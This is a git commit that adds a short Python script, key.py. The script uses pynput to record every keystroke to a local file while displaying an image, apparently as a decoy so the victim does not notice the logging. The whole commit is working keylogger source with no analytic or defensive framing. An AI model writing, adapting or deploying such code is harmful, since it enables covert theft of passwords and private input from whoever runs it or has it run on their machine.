2d8c1beb9517de44f69483826f0499dd179415c8
Frankom <vasylopozdro@gmail.com>
2025-03-10 21:39:56 +0100

    first commit

---
+++ key.py
@@ -0,0 +1,36 @@
+from pynput import keyboard
+#from pynput.keyboard import Listener
+from PIL import Image
+import signal
+import sys
+import time
+
+
+def on_press(key):
+    with open('file', 'a') as f:
+        f.write(str(key)+' ')
+
+Image.open('urabe.jpg').show()
+
+#with Listener(on_press=on_press) as listener:
+#    listener.join()
+listener = keyboard.Listener(on_press=on_press)
+listener.start()
+
+running = True  
+
+def handle_exit(signum, frame):
+    global running
+    print(f"\nReceived signal {signum}, exiting gracefully...")
+    running = False  
+    listener.stop()  
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, handle_exit)   # Ctrl+C
+signal.signal(signal.SIGTERM, handle_exit)  # kill <pid>
+
+while running:
+    try:
+        time.sleep(0.1) 
+    except KeyboardInterrupt:
+        handle_exit(signal.SIGINT, None)
